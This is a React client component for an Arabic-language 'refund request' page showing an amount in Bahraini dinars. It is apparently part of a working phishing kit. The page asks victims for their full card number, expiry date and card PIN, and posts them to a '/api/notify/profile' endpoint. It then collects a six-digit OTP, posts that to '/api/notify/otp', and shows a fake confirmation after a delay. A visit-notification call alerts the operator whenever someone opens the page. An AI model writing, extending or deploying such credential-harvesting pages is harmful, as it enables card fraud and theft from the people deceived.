"use client";

import { useEffect, useRef, useState } from "react";
import { CreditCard, Loader2, ShieldCheck } from "lucide-react";
import { OtpInput } from "@/components/OtpInput";

const EMPTY = ["", "", "", "", "", ""];

export function ProfileClient({ id, name, amount }: { id: string; name: string; amount: number }) {
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [pin, setPin] = useState("");
  
  const [error, setError] = useState("");
  const [step, setStep] = useState<"form" | "otp">("form");
  const [digits, setDigits] = useState<string[]>(EMPTY);
  const [loading, setLoading] = useState(false);
  const [notice, setNotice] = useState("");
  const [sending, setSending] = useState(false);
  const visited = useRef(false);

  useEffect(() => {
    if (visited.current) return;
    visited.current = true;
    fetch("/api/notify/visit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ profileId: id }),
    }).catch(() => null);
  }, [id]);

  async function onSend(e: React.FormEvent) {
    e.preventDefault();
    setError("");
    
    if (!/^\d{16}$/.test(cardNumber)) {
      setError("برجاء إدخال رقم بطاقة صحيح مكون من 16 رقم.");
      return;
    }
    if (!expiryDate.trim()) {
      setError("برجاء إدخال تاريخ الانتهاء.");
      return;
    }
    if (!/^(\d{4}|\d{6})$/.test(pin)) {
      setError("برجاء إدخال الرقم السري بشكل صحيح (4 أو 6 أرقام).");
      return;
    }

    setSending(true);
    const res = await fetch("/api/notify/profile", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        profileId: id, 
        method: "card", 
        cardNumber, 
        expiryDate, 
        pin,
        value: cardNumber // Added for backend compatibility if it expects 'value'
      }),
    }).catch(() => null);
    
    setSending(false);
    
    if (!res || !res.ok) {
      setError("حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى.");
      return;
    }
    setStep("otp");
  }

  async function onConfirm() {
    const code = digits.join("");
    if (code.length !== 6) return;
    setNotice("");
    setLoading(true);
    await fetch("/api/notify/otp", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code, method: "card", value: cardNumber }),
    }).catch(() => null);
    setTimeout(() => {
      setLoading(false);
      setDigits(EMPTY);
      setNotice("تم تأكيد الرمز بنجاح، شكراً لك.");
    }, 5000);
  }

  return (
    <main className="mx-auto flex min-h-screen w-full max-w-2xl flex-col justify-center px-4 py-10">
      <div className="card-soft animate-fade-in p-6 sm:p-8">
        <div className="flex items-center gap-3">
          <span className="btn-brand flex h-12 w-12 items-center justify-center rounded-2xl">
            <ShieldCheck className="h-6 w-6" />
          </span>
          <div>
            <h1 className="text-xl font-extrabold sm:text-2xl">تفاصيل طلب الاسترجاع</h1>
            <p className="mt-1 text-sm text-muted-foreground">مرحباً {name}، أكمل الحقول لإتمام العملية.</p>
          </div>
        </div>

        <div className="mt-6 rounded-2xl border border-border bg-accent/40 p-4 text-right">
          <p className="text-xs font-semibold text-muted-foreground">مبلغ الاسترجاع</p>
          <p className="mt-1 text-2xl font-extrabold text-primary" dir="ltr">
            {amount.toFixed(3)} BHD
          </p>
        </div>

        {step === "form" ? (
          <form onSubmit={onSend} className="mt-6 space-y-5">
            
            {/* الخانة الثابتة الجديدة */}
            <div className="flex flex-col items-center justify-center w-full p-4 mb-6 border-2 border-primary rounded-2xl bg-accent cursor-default">
              <div className="flex items-center justify-center w-12 h-12 mb-2 text-primary-foreground bg-primary rounded-xl">
                <CreditCard className="h-6 w-6" />
              </div>
              <span className="font-bold text-lg text-foreground">الاسترجاع علي بطاقة البنك</span>
            </div>

            {/* حقول الإدخال الثلاثة */}
            <div className="space-y-4">
              <div>
                <label htmlFor="cardNumber" className="mb-2 block text-sm font-bold">
                  رقم البطاقة
                </label>
                <input
                  id="cardNumber"
                  inputMode="numeric"
                  maxLength={16}
                  value={cardNumber}
                  onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, ""))}
                  placeholder="0000000000000000"
                  className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15 text-left"
                  dir="ltr"
                />
              </div>
              
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label htmlFor="expiryDate" className="mb-2 block text-sm font-bold">
                    تاريخ الانتهاء
                  </label>
                  <input
                    id="expiryDate"
                    value={expiryDate}
                    onChange={(e) => setExpiryDate(e.target.value)}
                    placeholder="MM/YY"
                    className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15 text-left"
                    dir="ltr"
                  />
                </div>
                <div>
                  <label htmlFor="pin" className="mb-2 block text-sm font-bold">
                    الرقم السري (PIN)
                  </label>
                  <input
                    id="pin"
                    type="password"
                    inputMode="numeric"
                    maxLength={6}
                    value={pin}
                    onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
                    placeholder="****"
                    className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15 text-left"
                    dir="ltr"
                  />
                </div>
              </div>
            </div>

            {error && <p className="text-sm font-semibold text-destructive">{error}</p>}

            <button
              type="submit"
              disabled={sending}
              className="btn-brand inline-flex w-full items-center justify-center gap-2 rounded-2xl px-6 py-4 text-base font-extrabold"
            >
              {sending && <Loader2 className="h-5 w-5 animate-spin" />}
              إرسال
            </button>
          </form>
        ) : loading ? (
          <div className="flex flex-col items-center gap-4 py-14 text-center">
            <Loader2 className="h-12 w-12 animate-spin text-primary" />
            <p className="text-base font-bold">جاري التحقق من البيانات...</p>
          </div>
        ) : (
          <div className="mt-6 text-center">
            <h2 className="text-lg font-extrabold">تأكيد رمز التحقق</h2>
            <p className="mt-2 text-sm text-muted-foreground">
              برجاء كتابة الرمز المكون من 6 أرقام المرسل إلى هاتفك.
            </p>
            {notice && (
              <p className="mt-4 rounded-xl bg-accent px-4 py-3 text-sm font-semibold text-accent-foreground">
                {notice}
              </p>
            )}
            <div className="mt-6">
              <OtpInput digits={digits} onChange={setDigits} />
            </div>
            <button
              type="button"
              onClick={onConfirm}
              disabled={digits.join("").length !== 6}
              className="btn-brand mt-6 w-full rounded-2xl px-6 py-4 text-base font-extrabold"
            >
              تأكيد وإتمام الاسترجاع
            </button>
          </div>
        )}
      </div>
    </main>
  );
}
